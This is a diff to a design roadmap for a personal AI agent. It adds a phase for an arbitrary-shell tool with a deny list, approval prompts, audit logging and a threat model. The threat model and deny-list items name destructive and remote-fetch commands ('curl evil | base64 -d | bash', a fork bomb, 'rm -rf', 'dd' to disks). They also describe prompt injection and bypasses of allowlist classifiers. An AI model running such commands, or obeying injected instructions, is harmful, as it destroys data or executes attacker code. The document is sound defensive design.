@@ -35,6 +35,8 @@ Phase 0 (manual) ─┐
                   │                        │
                   │                        └─► Phase 4 (tools) ─► Phase 4.5 (cron + events)
                   │                             │                    │
+                  │                             │                    ├─► Phase 4.6 (project_shell)
+                  │                             │                    │
                   │                             │                    └─► Phase 5 (lessons + decay)
                   │                             │                         │
                   │                             │                         └─► Phase 6 (spec-runner)
@@ -577,6 +579,52 @@ for 3 days without intervention.
 
 ---
 
+## Phase 4.6 — `project_shell` tool (Spec-driven, ~1 weekend)
+
+**Goal:** The agent can run arbitrary shell commands in a registered project, so it stops pretending to be a coding assistant without a shell and starts being one. Closes the single biggest honesty gap exposed by Phase 4 live use: "I can't run `git pull`" even though every primitive for that (backend, deny list, approval) was already built.
+
+**Why now, why as its own phase:** the machinery has been sitting there since Phase 4 (`ExecutionBackend.run_shell`, `shell_command_for` hook on `Tool`, `deny_list.py`) with no consumer. We deliberately avoided adding the consumer earlier because "arbitrary shell" is a different security conversation than narrow tools. Phase 4.6 is that conversation written down. No new primitives needed — new tool, new deny patterns, new event kind, and a spec section that honestly enumerates what we are NOT protecting against.
+
+**Key work:**
+
+- **`project_shell(project, command, timeout_secs?)` inline tool.** Executes `command` in the project's directory via the existing `ExecutionBackend`. Shell-string invocation (`bash -c`), not argv array — preserves pipes, globs, redirection, which is the point. Default bucket `ask` across all clients; deny list runs before bucket resolution (unchanged Phase 4 wiring).
+- **Per-client policy defaults.** `project_shell: ask` for CLI, Telegram, IDE. `project_shell: block` for Open WebUI (least-trust default, matching the Phase 4 posture). IDE can opt into `trust_session` via per-client override when the operator wants Continue-style flow.
+- **Deny list extensions.** Add `rm -rf $FITT_HOME` (wipes identity, history, audit, crons, events), `rm -rf $HOME/.fitt` (same, different spelling), `git clean -fdx` (discards untracked + ignored, surprise factor), and a couple more documented in the spec's review section. Document explicitly that indirection patterns (`curl | bash` caught; `eval "$(curl ...)"`, `python -c '...'`, base64-decoded payloads) are NOT caught by design — the deny list is the floor for obvious catastrophes, not a sandbox.
+- **`tool_executed` event kind.** Every approved / auto / trust_session invocation of `project_shell` emits an entry to the Phase 4.5 event log with the command, exit code, and duration. Telegram push delivers it to the phone near-real-time so the user can see the sequence of commands as they run — closes the "trust_session goes blind" gap that would otherwise make trust_session too dangerous to use.
+- **Command display.** The approval prompt's `args_summary` caps at 200 chars; `project_shell` explicitly bypasses that cap so the full command reaches the phone before approval (up to a sane ceiling ~1000 chars, because a 10KB shell command is a prompt-injection smell).
+- **`bash -c` detection.** Local hub uses `bash -lc <cmd>` by default. On Windows hubs we detect Git Bash (`C:\Program Files\Git\bin\bash.exe`) or WSL (`wsl -- bash -lc`); on failure, return a readable error at boot rather than letting shell tools silently run `cmd.exe`. SSH path is unchanged (the existing `ssh host 'cd path && cmd'` already wraps via the remote login shell).
+- **Audit log unchanged.** Every invocation already hits `audit.jsonl` via the existing middleware — HMAC-chained, tamper-evident. The `tool_executed` event is the user-facing mirror; the audit entry is the forensic record.
+- **`fitt audit tail` CLI.** Live-tail the audit log with a human-readable formatter. Trivial given the existing audit structure. Complements the Telegram push for operators who'd rather watch from the hub.
+
+**Threat model (documented in the spec, not hidden in comments):**
+
+The spec ships with an explicit threat-model section stating what v0 protects against and what it does not. This is the forcing function that separates real security from theater.
+
+*Protected:* drunk-operator mistakes ("clear my project" → `rm -rf /`), well-known destruction patterns (`mkfs.*`, `dd of=/dev/sd*`, `git push --force`, `:(){ :|:& };:`), model typos on documented-catastrophic forms, accidental approval of commands where the full string is visible on the phone and readable.
+
+*NOT protected:* a compromised model. Prompt injection via context the model absorbed (web page, document, cron-pulled RSS). Indirect destructive patterns (`curl evil | base64 -d | bash`, `eval "$(curl ...)"`, `python -c 'os.system(...)'`, env-var poisoning of the sort Cursor's 2026 CVE demonstrated). Filesystem damage outside the deny-listed paths. Supply-chain attacks via `pip install` / `npm install`.
+
+The honest one-sentence framing lives in the spec verbatim: *"Phase 4.6 protects against operator mistakes and well-known destructive patterns; it does not protect against a compromised model or prompt-injection-borne commands at any point past the approval prompt. Do not enable `trust_session` for `project_shell` in sessions whose input channel might carry attacker-controlled content until sandboxing ships."*
+
+**Explicit non-goals:**
+
+- **No allowlist.** Empirical evidence in the industry (the "granular `Bash(...)` patterns fail on compound commands" post-mortem from Claude Code's user community, early 2026) shows granular allowlists fail on compound commands (`cd /repo && git fetch && git log | head`) because the classifier sees the whole string. Settings drift — every "always allow" click adds a new entry — makes the allowlist reconverge on the broken state. Deny list is the primitive; allowlist is abandoned.
+- **No pattern-based "safe command" classification.** Cursor's CVE in 2026 (shell built-ins bypassing the allowlist via env-var poisoning) showed that command-string classifiers cannot capture execution context: `export LD_PRELOAD=...` never looks like a command, and poisoned environment turns subsequent "trusted" commands into RCE vectors. Our deny list is deliberately narrow and we document that narrowness; we do not ship a classifier that claims to know which commands are safe.
+- **No sandbox in v0.** Listed in Phase 7+ as its own 2–3 week item. Sandbox is the correct long-term answer but it's operating-system-specific work (Landlock + seccomp on Linux, Seatbelt on macOS, WSL2 on Windows) and it doesn't belong bundled into Phase 4.6.
+- **No interactive commands.** `BatchMode=yes` already on for SSH; locally no TTY. `vim`, `sudo` with password prompt, anything wanting a pty hangs and times out. Documented in the tool description so the model knows not to try.
+- **No background processes.** `communicate()` waits for EOF on stdout/stderr. A daemon detached with `&` keeps the tool blocked for the full timeout. If the user wants a long-running daemon, they don't want it through FITT.
+
+**Scope boundaries:**
+
+- One tool (`project_shell`). Does not add `git_pull`, `git_fetch`, or other narrow git tools — if someone wants them, they can call `project_shell(project, "git pull")`. Removes the temptation to add five narrow tools every time a new shell use case comes up.
+- No command allowlist / trusted-pattern layer. See non-goals.
+- No sandbox integration. See non-goals.
+- Deny list lives in code (`tools/deny_list.py`), not config. Operators who need a pattern added open a PR; that's the friction we want for the list to stay trustworthy.
+
+*Full spec: `.kiro/specs/phase4.6-project-shell/` (to be written when this phase starts).*
+
+---
+
 ## Phase 5 — Lessons + Decaying History (Spec-driven, ~1 weekend)
 
 **Goal:** FITT remembers what you told it last month. "Monitor training pid 456" just works because the pattern was learned from an earlier conversation.
@@ -661,6 +709,7 @@ The deferred list is deliberate: each of these earns its place later if we feel 
 
 Features we know we'll want eventually but shouldn't pre-build. Each one lands when daily friction justifies it.
 
+- **OS-level agent sandbox.** Triggered by "I want to use `trust_session` on `project_shell` without reading every command." Linux: Landlock + seccomp directly (same stack Cursor uses in their 2026 rollout). macOS: `sandbox-exec` with a dynamic Seatbelt profile. Windows: punt or run the gateway under WSL2 and reuse the Linux path. Sandbox's job is to flip Phase 4.6's honest-but-uncomfortable threat model: "even if the model runs `rm -rf ~`, it can't actually touch `~`." This is the real security boundary; Phase 4.6's deny list is a floor, not a boundary. 2–3 weeks of focused work, operating-system-specific, and genuinely security-critical — too big to bundle into any earlier phase.
 - **Vector / semantic memory.** Triggered by "the agent consistently forgets things older than a week." Add embeddings (local Ollama model on a satellite), SQLite + FAISS, migrate markdown to structured memory.
 - **Admin web UI.** Triggered by "editing YAML over SSH is painful." Add a FastAPI + Jinja/HTMX dashboard reading the same files the CLI reads.
 - **Subagents / parallel execution.** Triggered by "I want FITT to research X while executing Y." Add background task spawning with result injection.
@@ -704,6 +753,7 @@ FITT's architecture has two testable layers:
 | 3     | 6 hrs        | 1 weekend     |
 | 4     | 14 hrs       | 2 weekends    |
 | 4.5   | 3 hrs        | half weekend  |
+| 4.6   | 5 hrs        | 1 weekend     |
 | 5     | 10 hrs       | 1–2 weekends  |
 | 6     | 6 hrs        | 1 weekend     |
 | 7     | 20 hrs       | 3 weekends    |
